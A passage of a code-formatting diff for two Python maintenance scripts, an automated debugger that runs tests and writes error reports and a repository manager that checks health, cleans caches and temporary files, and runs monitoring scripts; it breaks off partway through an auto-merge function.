\n+\n         # Run existing test suites with debugging\n         test_commands = [\n-            ['python3', 'enhanced_test_suite.py'],\n-            ['python3', 'final_integration_test.py'],\n-            ['python3', 'test_automation_integration.py']\n+            [\"python3\", \"enhanced_test_suite.py\"],\n+            [\"python3\", \"final_integration_test.py\"],\n+            [\"python3\", \"test_automation_integration.py\"],\n         ]\n-        \n+\n         for cmd in test_commands:\n-            test_name = cmd[1].replace('.py', '')\n+            test_name = cmd[1].replace(\".py\", \"\")\n             print(f\"  \ud83e\uddea Running {test_name}...\")\n-            \n+\n             try:\n                 result = subprocess.run(\n-                    cmd, \n-                    capture_output=True, \n-                    text=True, \n-                    timeout=300,\n-                    cwd='.'\n-                )\n-                \n+                    cmd, capture_output=True, text=True, timeout=300, cwd=\".\"\n+                )\n+\n                 test_results[test_name] = {\n-                    'returncode': result.returncode,\n-                    'stdout': result.stdout,\n-                    'stderr': result.stderr,\n-                    'success': result.returncode == 0\n+                    \"returncode\": result.returncode,\n+                    \"stdout\": result.stdout,\n+                    \"stderr\": result.stderr,\n+                    \"success\": result.returncode == 0,\n                 }\n-                \n+\n                 # Analyze errors in output\n                 if result.returncode != 0:\n                     errors = self._analyze_test_output(result.stderr, test_name)\n-                    test_results[test_name]['detected_errors'] = errors\n-                    \n+                    test_results[test_name][\"detected_errors\"] = errors\n+\n             except subprocess.TimeoutExpired:\n                 test_results[test_name] = {\n-                    'returncode': -1,\n-                    'error': 'Test timed out',\n-                    'success': False\n+                    \"returncode\": -1,\n+                    \"error\": \"Test timed out\",\n+                    \"success\": False,\n                 }\n             except Exception as e:\n                 test_results[test_name] = {\n-                    'returncode': -1,\n-                    'error': str(e),\n-                    'success': False\n+                    \"returncode\": -1,\n+                    \"error\": str(e),\n+                    \"success\": False,\n                 }\n-                \n+\n         return test_results\n-        \n+\n     def _analyze_test_output(self, stderr: str, test_name: str) -> List[Dict[str, Any]]:\n         \"\"\"Analyze test output for error patterns\"\"\"\n         errors = []\n-        \n+\n         for category, patterns in self.known_patterns.items():\n             for pattern_info in patterns:\n-                pattern = pattern_info['pattern']\n+                pattern = pattern_info[\"pattern\"]\n                 matches = re.finditer(pattern, stderr, re.MULTILINE)\n-                \n+\n                 for match in matches:\n-                    errors.append({\n-                        'category': category,\n-                        'pattern': pattern,\n-                        'match': match.group(),\n-                        'fix': pattern_info['fix'],\n-                        'confidence': pattern_info['confidence'],\n-                        'test_source': test_name\n-                    })\n-                    \n+                    errors.append(\n+                        {\n+                            \"category\": category,\n+                            \"pattern\": pattern,\n+                            \"match\": match.group(),\n+                            \"fix\": pattern_info[\"fix\"],\n+                            \"confidence\": pattern_info[\"confidence\"],\n+                            \"test_source\": test_name,\n+                        }\n+                    )\n+\n         return errors\n-        \n+\n     def generate_automated_fixes(self, errors: List[ErrorPattern]) -> List[str]:\n         \"\"\"Generate automated fixes for detected errors\"\"\"\n         fixes = []\n-        \n+\n         # Group errors by file\n         errors_by_file = defaultdict(list)\n         for error in errors:\n             errors_by_file[error.file_path].append(error)\n-            \n+\n         for file_path, file_errors in errors_by_file.items():\n             fix_script = f\"# Automated fixes for {file_path}\\n\\n\"\n-            \n+\n             # Sort errors by line number (descending to avoid line number shifts)\n             file_errors.sort(key=lambda x: x.line_number, reverse=True)\n-            \n+\n             for error in file_errors:\n-                if error.confidence >= 0.8 and error.severity in ['high', 'critical']:\n-                    fix_script += f\"# Fix for line {error.line_number}: {error.message}\\n\"\n+                if error.confidence >= 0.8 and error.severity in [\"high\", \"critical\"]:\n+                    fix_script += (\n+                        f\"# Fix for line {error.line_number}: {error.message}\\n\"\n+                    )\n                     fix_script += f\"# Suggested fix: {error.suggested_fix}\\n\"\n-                    \n+\n                     # Generate specific fix code based on error type\n-                    if error.pattern_type == 'security_risk' and 'credential' in error.message:\n+                    if (\n+                        error.pattern_type == \"security_risk\"\n+                        and \"credential\" in error.message\n+                    ):\n                         fix_script += f\"# TODO: Move hardcoded credential to environment variable\\n\"\n-                    elif error.pattern_type == 'code_quality' and 'bare except' in error.message:\n+                    elif (\n+                        error.pattern_type == \"code_quality\"\n+                        and \"bare except\" in error.message\n+                    ):\n                         fix_script += f\"# TODO: Replace 'except:' with 'except Exception:' on line {error.line_number}\\n\"\n-                        \n+\n                     fix_script += \"\\n\"\n-                    \n+\n             fixes.append(fix_script)\n-            \n+\n         return fixes\n-        \n+\n     def recursive_improvement_cycle(self) -> Dict[str, Any]:\n         \"\"\"Run recursive improvement cycles\"\"\"\n         print(\"\ud83d\udd04 Running recursive improvement cycles...\")\n-        \n+\n         cycles = []\n         max_cycles = 3\n-        \n+\n         for cycle in range(max_cycles):\n             print(f\"  \ud83d\udcca Cycle {cycle + 1}/{max_cycles}\")\n-            \n+\n             cycle_start = time.time()\n-            \n+\n             # Analyze all Python files\n             all_errors = []\n-            python_files = list(Path('.').glob('**/*.py'))\n-            \n+            python_files = list(Path(\".\").glob(\"**/*.py\"))\n+\n             for file_path in python_files:\n-                if any(exclude in str(file_path) for exclude in ['.git', '__pycache__', '.pytest_cache']):\n+                if any(\n+                    exclude in str(file_path)\n+                    for exclude in [\".git\", \"__pycache__\", \".pytest_cache\"]\n+                ):\n                     continue\n-                    \n+\n                 file_errors = self.analyze_file_for_errors(file_path)\n                 all_errors.extend(file_errors)\n-                \n+\n             # Run tests\n             test_results = self.run_automated_tests_with_debugging()\n-            \n+\n             # Generate fixes\n             fixes = self.generate_automated_fixes(all_errors)\n-            \n+\n             cycle_data = {\n-                'cycle': cycle + 1,\n-                'duration': time.time() - cycle_start,\n-                'errors_found': len(all_errors),\n-                'critical_errors': len([e for e in all_errors if e.severity == 'critical']),\n-                'high_errors': len([e for e in all_errors if e.severity == 'high']),\n-                'test_results': test_results,\n-                'fixes_generated': len(fixes),\n-                'errors_by_type': {}\n+                \"cycle\": cycle + 1,\n+                \"duration\": time.time() - cycle_start,\n+                \"errors_found\": len(all_errors),\n+                \"critical_errors\": len(\n+                    [e for e in all_errors if e.severity == \"critical\"]\n+                ),\n+                \"high_errors\": len([e for e in all_errors if e.severity == \"high\"]),\n+                \"test_results\": test_results,\n+                \"fixes_generated\": len(fixes),\n+                \"errors_by_type\": {},\n             }\n-            \n+\n             # Group errors by type\n             for error in all_errors:\n                 error_type = error.pattern_type\n-                if error_type not in cycle_data['errors_by_type']:\n-                    cycle_data['errors_by_type'][error_type] = 0\n-                cycle_data['errors_by_type'][error_type] += 1\n-                \n+                if error_type not in cycle_data[\"errors_by_type\"]:\n+                    cycle_data[\"errors_by_type\"][error_type] = 0\n+                cycle_data[\"errors_by_type\"][error_type] += 1\n+\n             cycles.append(cycle_data)\n-            \n-            print(f\"    \u2705 Found {len(all_errors)} errors ({cycle_data['critical_errors']} critical)\")\n-            \n+\n+            print(\n+                f\"    \u2705 Found {len(all_errors)} errors ({cycle_data['critical_errors']} critical)\"\n+            )\n+\n             # Break if no critical errors found\n-            if cycle_data['critical_errors'] == 0 and cycle_data['high_errors'] == 0:\n+            if cycle_data[\"critical_errors\"] == 0 and cycle_data[\"high_errors\"] == 0:\n                 print(\"    \ud83c\udf89 No critical or high severity errors found!\")\n                 break\n-                \n+\n         return {\n-            'cycles': cycles,\n-            'total_cycles': len(cycles),\n-            'final_status': 'success' if cycles[-1]['critical_errors'] == 0 else 'needs_attention'\n+            \"cycles\": cycles,\n+            \"total_cycles\": len(cycles),\n+            \"final_status\": (\n+                \"success\" if cycles[-1][\"critical_errors\"] == 0 else \"needs_attention\"\n+            ),\n         }\n-        \n+\n     def generate_debugging_report(self, improvement_data: Dict[str, Any]) -> str:\n         \"\"\"Generate comprehensive debugging and improvement report\"\"\"\n         report = \"# \ud83d\udc1b Intelligent Debugging and Error Detection Report\\n\\n\"\n         report += f\"Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\\n\\n\"\n-        \n+\n         # Executive Summary\n-        final_cycle = improvement_data['cycles'][-1]\n+        final_cycle = improvement_data[\"cycles\"][-1]\n         report += \"## \ud83d\udcca Executive Summary\\n\\n\"\n-        report += f\"- **Total Improvement Cycles**: {improvement_data['total_cycles']}\\n\"\n+        report += (\n+            f\"- **Total Improvement Cycles**: {improvement_data['total_cycles']}\\n\"\n+        )\n         report += f\"- **Final Status**: {improvement_data['final_status'].replace('_', ' ').title()}\\n\"\n         report += f\"- **Critical Errors**: {final_cycle['critical_errors']}\\n\"\n         report += f\"- **High Priority Errors**: {final_cycle['high_errors']}\\n\"\n         report += f\"- **Total Errors Found**: {final_cycle['errors_found']}\\n\\n\"\n-        \n+\n         # Cycle Analysis\n         report += \"## \ud83d\udd04 Improvement Cycle Analysis\\n\\n\"\n-        \n-        for cycle_data in improvement_data['cycles']:\n-            status_emoji = \"\u2705\" if cycle_data['critical_errors'] == 0 else \"\u26a0\ufe0f\"\n+\n+        for cycle_data in improvement_data[\"cycles\"]:\n+            status_emoji = \"\u2705\" if cycle_data[\"critical_errors\"] == 0 else \"\u26a0\ufe0f\"\n             report += f\"### {status_emoji} Cycle {cycle_data['cycle']}\\n\\n\"\n             report += f\"- **Duration**: {cycle_data['duration']:.2f} seconds\\n\"\n             report += f\"- **Errors Found**: {cycle_data['errors_found']}\\n\"\n             report += f\"  - Critical: {cycle_data['critical_errors']}\\n\"\n             report += f\"  - High: {cycle_data['high_errors']}\\n\"\n             report += f\"- **Fixes Generated**: {cycle_data['fixes_generated']}\\n\"\n-            \n+\n             # Error breakdown\n-            if cycle_data['errors_by_type']:\n+            if cycle_data[\"errors_by_type\"]:\n                 report += \"- **Error Types**:\\n\"\n-                for error_type, count in cycle_data['errors_by_type'].items():\n+                for error_type, count in cycle_data[\"errors_by_type\"].items():\n                     report += f\"  - {error_type.replace('_', ' ').title()}: {count}\\n\"\n-                    \n+\n             # Test results\n-            test_results = cycle_data['test_results']\n-            successful_tests = sum(1 for result in test_results.values() if result.get('success', False))\n+            test_results = cycle_data[\"test_results\"]\n+            successful_tests = sum(\n+                1 for result in test_results.values() if result.get(\"success\", False)\n+            )\n             total_tests = len(test_results)\n-            \n+\n             report += f\"- **Test Results**: {successful_tests}/{total_tests} passed\\n\"\n-            \n+\n             if successful_tests < total_tests:\n                 report += \"- **Failed Tests**:\\n\"\n                 for test_name, result in test_results.items():\n-                    if not result.get('success', False):\n-                        report += f\"  - `{test_name}`: {result.get('error', 'Failed')}\\n\"\n-                        \n+                    if not result.get(\"success\", False):\n+                        report += (\n+                            f\"  - `{test_name}`: {result.get('error', 'Failed')}\\n\"\n+                        )\n+\n             report += \"\\n\"\n-            \n+\n         # Recommendations\n         report += \"## \ud83c\udfaf Recommendations\\n\\n\"\n-        \n-        if final_cycle['critical_errors'] > 0:\n+\n+        if final_cycle[\"critical_errors\"] > 0:\n             report += \"### \u26a0\ufe0f Critical Issues Requiring Immediate Attention\\n\\n\"\n             report += \"1. Address all critical security risks immediately\\n\"\n             report += \"2. Fix syntax errors preventing code execution\\n\"\n-            report += \"3. Remove hardcoded credentials and use environment variables\\n\\n\"\n-            \n-        if final_cycle['high_errors'] > 0:\n+            report += (\n+                \"3. Remove hardcoded credentials and use environment variables\\n\\n\"\n+            )\n+\n+        if final_cycle[\"high_errors\"] > 0:\n             report += \"### \ud83d\udd27 High Priority Improvements\\n\\n\"\n             report += \"1. Fix code quality issues affecting maintainability\\n\"\n             report += \"2. Address potential runtime errors\\n\"\n             report += \"3. Improve error handling patterns\\n\\n\"\n-            \n+\n         report += \"### \ud83d\udcc8 Continuous Improvement\\n\\n\"\n         report += \"1. Implement pre-commit hooks to catch issues early\\n\"\n         report += \"2. Set up automated code quality checks in CI/CD\\n\"\n         report += \"3. Regular security audits and dependency updates\\n\"\n         report += \"4. Code review processes for all changes\\n\\n\"\n-        \n+\n         return report\n-        \n+\n     def run_full_debugging_system(self) -> int:\n         \"\"\"Run the complete intelligent debugging system\"\"\"\n         print(\"\ud83e\udd16 Starting Intelligent Debugging and Error Detection System\")\n         print(\"=\" * 65)\n-        \n+\n         try:\n             # Run recursive improvement cycles\n             improvement_data = self.recursive_improvement_cycle()\n-            \n+\n             # Generate comprehensive report\n             debugging_report = self.generate_debugging_report(improvement_data)\n-            \n+\n             # Save reports\n-            with open('debugging-report.md', 'w') as f:\n+            with open(\"debugging-report.md\", \"w\") as f:\n                 f.write(debugging_report)\n-                \n-            with open('improvement-cycles.json', 'w') as f:\n+\n+            with open(\"improvement-cycles.json\", \"w\") as f:\n                 json.dump(improvement_data, f, indent=2, default=str)\n-                \n+\n             # Summary\n-            final_status = improvement_data['final_status']\n-            final_cycle = improvement_data['cycles'][-1]\n-            \n+            final_status = improvement_data[\"final_status\"]\n+            final_cycle = improvement_data[\"cycles\"][-1]\n+\n             print(f\"\\n\u2705 Debugging system execution completed!\")\n             print(f\"\ud83d\udcca Final Status: {final_status.replace('_', ' ').title()}\")\n             print(f\"\ud83d\udd0d Total Errors Found: {final_cycle['errors_found']}\")\n             print(f\"\u26a0\ufe0f  Critical Errors: {final_cycle['critical_errors']}\")\n             print(f\"\ud83d\udcc1 Reports generated:\")\n             print(f\"  - debugging-report.md\")\n             print(f\"  - improvement-cycles.json\")\n-            \n-            return 0 if final_cycle['critical_errors'] == 0 else 1\n-            \n+\n+            return 0 if final_cycle[\"critical_errors\"] == 0 else 1\n+\n         except Exception as e:\n             print(f\"\u274c Debugging system encountered an error: {e}\")\n             traceback.print_exc()\n             return 1\n \n-if __name__ == '__main__':\n+\n+if __name__ == \"__main__\":\n     debugger = IntelligentDebugger()\n     exit_code = debugger.run_full_debugging_system()\n-    sys.exit(exit_code)\n\\ No newline at end of file\n+    sys.exit(exit_code)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_repo_manager.py\t2025-09-14 19:21:57.115351+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_repo_manager.py\t2025-09-14 19:23:13.524974+00:00\n@@ -12,410 +12,496 @@\n from pathlib import Path\n from typing import Dict, List, Any\n import requests\n from datetime import datetime, timedelta\n \n+\n class IntelligentRepoManager:\n     def __init__(self):\n-        self.repo_path = Path('.')\n-        self.config_file = self.repo_path / 'repo-manager-config.json'\n-        self.state_file = self.repo_path / 'repo-manager-state.json'\n-        \n+        self.repo_path = Path(\".\")\n+        self.config_file = self.repo_path / \"repo-manager-config.json\"\n+        self.state_file = self.repo_path / \"repo-manager-state.json\"\n+\n         # Load configuration\n         self.config = self._load_config()\n         self.state = self._load_state()\n-        \n+\n     def _load_config(self) -> Dict[str, Any]:\n         \"\"\"Load repository manager configuration\"\"\"\n         default_config = {\n             \"auto_merge\": {\n                 \"enabled\": False,\n                 \"conditions\": {\n                     \"all_tests_pass\": True,\n                     \"no_conflicts\": True,\n                     \"approved_by_maintainer\": False,\n-                    \"security_scan_pass\": True\n-                }\n+                    \"security_scan_pass\": True,\n+                },\n             },\n             \"maintenance\": {\n                 \"auto_cleanup\": True,\n                 \"archive_old_branches\": True,\n                 \"update_dependencies\": True,\n-                \"generate_reports\": True\n+                \"generate_reports\": True,\n             },\n             \"monitoring\": {\n                 \"performance_tracking\": True,\n                 \"security_monitoring\": True,\n                 \"dependency_alerts\": True,\n-                \"error_detection\": True\n+                \"error_detection\": True,\n             },\n             \"optimization\": {\n                 \"compress_assets\": True,\n                 \"optimize_images\": False,\n                 \"minify_code\": False,\n-                \"cache_dependencies\": True\n-            }\n-        }\n-        \n+                \"cache_dependencies\": True,\n+            },\n+        }\n+\n         if self.config_file.exists():\n             try:\n-                with open(self.config_file, 'r') as f:\n+                with open(self.config_file, \"r\") as f:\n                     user_config = json.load(f)\n                 # Merge with defaults\n                 for key, value in user_config.items():\n                     if isinstance(value, dict) and key in default_config:\n                         default_config[key].update(value)\n                     else:\n                         default_config[key] = value\n             except Exception as e:\n                 print(f\"Warning: Could not load config: {e}\")\n-                \n+\n         return default_config\n-        \n+\n     def _load_state(self) -> Dict[str, Any]:\n         \"\"\"Load repository manager state\"\"\"\n         default_state = {\n             \"last_maintenance\": None,\n             \"last_optimization\": None,\n             \"last_security_scan\": None,\n             \"performance_baseline\": {},\n             \"error_history\": [],\n-            \"dependency_updates\": []\n-        }\n-        \n+            \"dependency_updates\": [],\n+        }\n+\n         if self.state_file.exists():\n             try:\n-                with open(self.state_file, 'r') as f:\n+                with open(self.state_file, \"r\") as f:\n                     return json.load(f)\n             except Exception as e:\n                 print(f\"Warning: Could not load state: {e}\")\n-                \n+\n         return default_state\n-        \n+\n     def _save_state(self):\n         \"\"\"Save current state\"\"\"\n         try:\n-            with open(self.state_file, 'w') as f:\n+            with open(self.state_file, \"w\") as f:\n                 json.dump(self.state, f, indent=2, default=str)\n         except Exception as e:\n             print(f\"Warning: Could not save state: {e}\")\n-            \n+\n     def check_repository_health(self) -> Dict[str, Any]:\n         \"\"\"Check overall repository health\"\"\"\n         print(\"\ud83c\udfe5 Checking repository health...\")\n-        \n+\n         health_report = {\n             \"timestamp\": datetime.now().isoformat(),\n             \"overall_status\": \"healthy\",\n             \"issues\": [],\n-            \"metrics\": {}\n-        }\n-        \n+            \"metrics\": {},\n+        }\n+\n         # Check Git repository status\n         try:\n-            result = subprocess.run(['git', 'status', '--porcelain'], \n-                                  capture_output=True, text=True)\n+            result = subprocess.run(\n+                [\"git\", \"status\", \"--porcelain\"], capture_output=True, text=True\n+            )\n             if result.stdout.strip():\n                 health_report[\"issues\"].append(\"Uncommitted changes detected\")\n         except Exception as e:\n             health_report[\"issues\"].append(f\"Git status check failed: {e}\")\n-            \n+\n         # Check for required files\n-        required_files = ['README.md', 'requirements.txt', 'package.json']\n+        required_files = [\"README.md\", \"requirements.txt\", \"package.json\"]\n         for file in required_files:\n             if not Path(file).exists():\n                 health_report[\"issues\"].append(f\"Missing required file: {file}\")\n-                \n+\n         # Check Python environment\n         try:\n-            result = subprocess.run([sys.executable, '--version'], \n-                                  capture_output=True, text=True)\n+            result = subprocess.run(\n+                [sys.executable, \"--version\"], capture_output=True, text=True\n+            )\n             health_report[\"metrics\"][\"python_version\"] = result.stdout.strip()\n         except Exception as e:\n             health_report[\"issues\"].append(f\"Python check failed: {e}\")\n-            \n+\n         # Check Node.js environment\n         try:\n-            result = subprocess.run(['node', '--version'], \n-                                  capture_output=True, text=True)\n+            result = subprocess.run(\n+                [\"node\", \"--version\"], capture_output=True, text=True\n+            )\n             health_report[\"metrics\"][\"node_version\"] = result.stdout.strip()\n         except Exception as e:\n             health_report[\"issues\"].append(f\"Node.js check failed: {e}\")\n-            \n+\n         # Run security validation\n         try:\n-            result = subprocess.run([sys.executable, 'scripts/security_validator.py'], \n-                                  capture_output=True, text=True, timeout=60)\n+            result = subprocess.run(\n+                [sys.executable, \"scripts/security_validator.py\"],\n+                capture_output=True,\n+                text=True,\n+                timeout=60,\n+            )\n             health_report[\"metrics\"][\"security_issues\"] = result.returncode\n         except Exception as e:\n             health_report[\"issues\"].append(f\"Security validation failed: {e}\")\n-            \n+\n         # Run performance tests\n         try:\n-            result = subprocess.run([sys.executable, 'scripts/performance_tester.py'], \n-                                  capture_output=True, text=True, timeout=120)\n+            result = subprocess.run(\n+                [sys.executable, \"scripts/performance_tester.py\"],\n+                capture_output=True,\n+                text=True,\n+                timeout=120,\n+            )\n             health_report[\"metrics\"][\"performance_status\"] = result.returncode\n         except Exception as e:\n             health_report[\"issues\"].append(f\"Performance test failed: {e}\")\n-            \n+\n         # Determine overall status\n         if len(health_report[\"issues\"]) == 0:\n             health_report[\"overall_status\"] = \"healthy\"\n         elif len(health_report[\"issues\"]) <= 2:\n             health_report[\"overall_status\"] = \"warning\"\n         else:\n             health_report[\"overall_status\"] = \"critical\"\n-            \n+\n         return health_report\n-        \n+\n     def automated_maintenance(self) -> Dict[str, Any]:\n         \"\"\"Perform automated repository maintenance\"\"\"\n         print(\"\ud83d\udd27 Running automated maintenance...\")\n-        \n+\n         maintenance_report = {\n             \"timestamp\": datetime.now().isoformat(),\n             \"tasks_completed\": [],\n             \"tasks_failed\": [],\n-            \"cleanup_summary\": {}\n-        }\n-        \n+            \"cleanup_summary\": {},\n+        }\n+\n         if self.config[\"maintenance\"][\"auto_cleanup\"]:\n             print(\"  \ud83e\uddf9 Running cleanup tasks...\")\n-            \n+\n             # Clean Python cache\n             try:\n-                subprocess.run(['find', '.', '-name', '__pycache__', '-type', 'd', '-exec', 'rm', '-rf', '{}', '+'], \n-                             check=False)\n-                subprocess.run(['find', '.', '-name', '*.pyc', '-delete'], check=False)\n+                subprocess.run(\n+                    [\n+                        \"find\",\n+                        \".\",\n+                        \"-name\",\n+                        \"__pycache__\",\n+                        \"-type\",\n+                        \"d\",\n+                        \"-exec\",\n+                        \"rm\",\n+                        \"-rf\",\n+                        \"{}\",\n+                        \"+\",\n+                    ],\n+                    check=False,\n+                )\n+                subprocess.run([\"find\", \".\", \"-name\", \"*.pyc\", \"-delete\"], check=False)\n                 maintenance_report[\"tasks_completed\"].append(\"Python cache cleanup\")\n             except Exception as e:\n                 maintenance_report[\"tasks_failed\"].append(f\"Python cache cleanup: {e}\")\n-                \n+\n             # Clean Node.js cache\n             try:\n-                if Path('node_modules').exists():\n-                    result = subprocess.run(['npm', 'cache', 'clean', '--force'], \n-                                          capture_output=True, text=True)\n-                    maintenance_report[\"tasks_completed\"].append(\"Node.js cache cleanup\")\n+                if Path(\"node_modules\").exists():\n+                    result = subprocess.run(\n+                        [\"npm\", \"cache\", \"clean\", \"--force\"],\n+                        capture_output=True,\n+                        text=True,\n+                    )\n+                    maintenance_report[\"tasks_completed\"].append(\n+                        \"Node.js cache cleanup\"\n+                    )\n             except Exception as e:\n                 maintenance_report[\"tasks_failed\"].append(f\"Node.js cache cleanup: {e}\")\n-                \n+\n             # Remove temporary files\n             try:\n-                temp_patterns = ['*.tmp', '*.temp', '*.log', '*~', '*.bak']\n+                temp_patterns = [\"*.tmp\", \"*.temp\", \"*.log\", \"*~\", \"*.bak\"]\n                 for pattern in temp_patterns:\n-                    subprocess.run(['find', '.', '-name', pattern, '-type', 'f', '-delete'], \n-                                 check=False)\n+                    subprocess.run(\n+                        [\"find\", \".\", \"-name\", pattern, \"-type\", \"f\", \"-delete\"],\n+                        check=False,\n+                    )\n                 maintenance_report[\"tasks_completed\"].append(\"Temporary file cleanup\")\n             except Exception as e:\n-                maintenance_report[\"tasks_failed\"].append(f\"Temporary file cleanup: {e}\")\n-                \n+                maintenance_report[\"tasks_failed\"].append(\n+                    f\"Temporary file cleanup: {e}\"\n+                )\n+\n         if self.config[\"maintenance\"][\"generate_reports\"]:\n             print(\"  \ud83d\udcca Generating maintenance reports...\")\n-            \n+\n             try:\n                 # Run comprehensive test framework\n-                result = subprocess.run([sys.executable, 'scripts/comprehensive_test_framework.py'], \n-                                      capture_output=True, text=True, timeout=300)\n+                result = subprocess.run(\n+                    [sys.executable, \"scripts/comprehensive_test_framework.py\"],\n+                    capture_output=True,\n+                    text=True,\n+                    timeout=300,\n+                )\n                 if result.returncode == 0:\n-                    maintenance_report[\"tasks_completed\"].append(\"Comprehensive test report generation\")\n+                    maintenance_report[\"tasks_completed\"].append(\n+                        \"Comprehensive test report generation\"\n+                    )\n                 else:\n-                    maintenance_report[\"tasks_failed\"].append(\"Comprehensive test report generation\")\n-            except Exception as e:\n-                maintenance_report[\"tasks_failed\"].append(f\"Test report generation: {e}\")\n-                \n+                    maintenance_report[\"tasks_failed\"].append(\n+                        \"Comprehensive test report generation\"\n+                    )\n+            except Exception as e:\n+                maintenance_report[\"tasks_failed\"].append(\n+                    f\"Test report generation: {e}\"\n+                )\n+\n             try:\n                 # Run intelligent debugging\n-                result = subprocess.run([sys.executable, 'scripts/intelligent_debugger.py'], \n-                                      capture_output=True, text=True, timeout=300)\n+                result = subprocess.run(\n+                    [sys.executable, \"scripts/intelligent_debugger.py\"],\n+                    capture_output=True,\n+                    text=True,\n+                    timeout=300,\n+                )\n                 if result.returncode == 0:\n-                    maintenance_report[\"tasks_completed\"].append(\"Intelligent debugging report\")\n+                    maintenance_report[\"tasks_completed\"].append(\n+                        \"Intelligent debugging report\"\n+                    )\n                 else:\n-                    maintenance_report[\"tasks_failed\"].append(\"Intelligent debugging report\")\n-            except Exception as e:\n-                maintenance_report[\"tasks_failed\"].append(f\"Debugging report generation: {e}\")\n-                \n+                    maintenance_report[\"tasks_failed\"].append(\n+                        \"Intelligent debugging report\"\n+                    )\n+            except Exception as e:\n+                maintenance_report[\"tasks_failed\"].append(\n+                    f\"Debugging report generation: {e}\"\n+                )\n+\n         # Update state\n         self.state[\"last_maintenance\"] = datetime.now().isoformat()\n         self._save_state()\n-        \n+\n         return maintenance_report\n-        \n+\n     def optimize_repository(self) -> Dict[str, Any]:\n         \"\"\"Optimize repository for performance and storage\"\"\"\n         print(\"\u26a1 Optimizing repository...\")\n-        \n+\n         optimization_report = {\n             \"timestamp\": datetime.now().isoformat(),\n             \"optimizations_applied\": [],\n             \"space_saved\": 0,\n-            \"performance_improvements\": {}\n-        }\n-        \n+            \"performance_improvements\": {},\n+        }\n+\n         if self.config[\"optimization\"][\"compress_assets\"]:\n             print(\"  \ud83d\udce6 Compressing assets...\")\n-            \n+\n             # Git garbage collection\n             try:\n-                result = subprocess.run(['git', 'gc', '--aggressive'], \n-                                      capture_output=True, text=True)\n-                optimization_report[\"optimizations_applied\"].append(\"Git garbage collection\")\n+                result = subprocess.run(\n+                    [\"git\", \"gc\", \"--aggressive\"], capture_output=True, text=True\n+                )\n+                optimization_report[\"optimizations_applied\"].append(\n+                    \"Git garbage collection\"\n+                )\n             except Exception as e:\n                 print(f\"Git gc failed: {e}\")\n-                \n+\n         if self.config[\"optimization\"][\"cache_dependencies\"]:\n             print(\"  \ud83d\udcbe Optimizing dependency cache...\")\n-            \n+\n             # Python dependencies\n             try:\n-                subprocess.run([sys.executable, '-m', 'pip', 'cache', 'purge'], \n-                             check=False)\n-                optimization_report[\"optimizations_applied\"].append(\"Python dependency cache optimization\")\n+                subprocess.run(\n+                    [sys.executable, \"-m\", \"pip\", \"cache\", \"purge\"], check=False\n+                )\n+                optimization_report[\"optimizations_applied\"].append(\n+                    \"Python dependency cache optimization\"\n+                )\n             except Exception as e:\n                 print(f\"Python cache optimization failed: {e}\")\n-                \n+\n         # Update state\n         self.state[\"last_optimization\"] = datetime.now().isoformat()\n         self._save_state()\n-        \n+\n         return optimization_report\n-        \n+\n     def monitor_and_alert(self) -> Dict[str, Any]:\n         \"\"\"Monitor repository and send alerts if needed\"\"\"\n         print(\"\ud83d\udcca Monitoring repository status...\")\n-        \n+\n         monitoring_report = {\n             \"timestamp\": datetime.now().isoformat(),\n             \"alerts\": [],\n             \"metrics\": {},\n-            \"recommendations\": []\n-        }\n-        \n+            \"recommendations\": [],\n+        }\n+\n         if self.config[\"monitoring\"][\"performance_tracking\"]:\n             # Check performance metrics\n             try:\n-                result = subprocess.run([sys.executable, 'scripts/performance_tester.py'], \n-                                      capture_output=True, text=True, timeout=120)\n+                result = subprocess.run(\n+                    [sys.executable, \"scripts/performance_tester.py\"],\n+                    capture_output=True,\n+                    text=True,\n+                    timeout=120,\n+                )\n                 if result.returncode != 0:\n                     monitoring_report[\"alerts\"].append(\"Performance tests failing\")\n                 else:\n                     monitoring_report[\"metrics\"][\"performance\"] = \"passing\"\n             except Exception as e:\n-                monitoring_report[\"alerts\"].append(f\"Performance monitoring failed: {e}\")\n-                \n+                monitoring_report[\"alerts\"].append(\n+                    f\"Performance monitoring failed: {e}\"\n+                )\n+\n         if self.config[\"monitoring\"][\"security_monitoring\"]:\n             # Check security status\n             try:\n-                result = subprocess.run([sys.executable, 'scripts/security_validator.py'], \n-                                      capture_output=True, text=True, timeout=60)\n+                result = subprocess.run(\n+                    [sys.executable, \"scripts/security_validator.py\"],\n+                    capture_output=True,\n+                    text=True,\n+                    timeout=60,\n+                )\n                 if result.returncode != 0:\n-                    monitoring_report[\"alerts\"].append(\"Security validation issues found\")\n+                    monitoring_report[\"alerts\"].append(\n+                        \"Security validation issues found\"\n+                    )\n                 else:\n                     monitoring_report[\"metrics\"][\"security\"] = \"passing\"\n             except Exception as e:\n                 monitoring_report[\"alerts\"].append(f\"Security monitoring failed: {e}\")\n-                \n+\n         if self.config[\"monitoring\"][\"error_detection\"]:\n             # Check for recent errors\n             try:\n-                result = subprocess.run([sys.executable, 'scripts/intelligent_debugger.py'], \n-                                      capture_output=True, text=True, timeout=300)\n+                result = subprocess.run(\n+                    [sys.executable, \"scripts/intelligent_debugger.py\"],\n+                    capture_output=True,\n+                    text=True,\n+                    timeout=300,\n+                )\n                 if result.returncode != 0:\n                     monitoring_report[\"alerts\"].append(\"Error detection found issues\")\n                 else:\n                     monitoring_report[\"metrics\"][\"error_detection\"] = \"passing\"\n             except Exception as e:\n                 monitoring_report[\"alerts\"].append(f\"Error detection failed: {e}\")\n-                \n+\n         # Generate recommendations\n         if len(monitoring_report[\"alerts\"]) > 0:\n-            monitoring_report[\"recommendations\"].append(\"Address reported alerts immediately\")\n-            \n+            monitoring_report[\"recommendations\"].append(\n+                \"Address reported alerts immediately\"\n+            )\n+\n         if len(monitoring_report[\"alerts\"]) == 0:\n-            monitoring_report[\"recommendations\"].append(\"Repository is healthy - continue regular monitoring\")\n-            \n+            monitoring_report[\"recommendations\"].append(\n+                \"Repository is healthy - continue regular monitoring\"\n+            )\n+\n         return monitoring_report\n-        \n+\n     def auto_merge_eligible_prs(self) -> Dict[str, Any]:\n         \"\"\"Automatically merge eligible pull requests\"\"\"\n         print(\"\ud83d\udd00 Checking for auto-merge eligible PRs...\")\n-        \n+\n         merge_report = {\n             \"timestamp\": datetime.now().isoformat(),\n             \"prs_checked\": 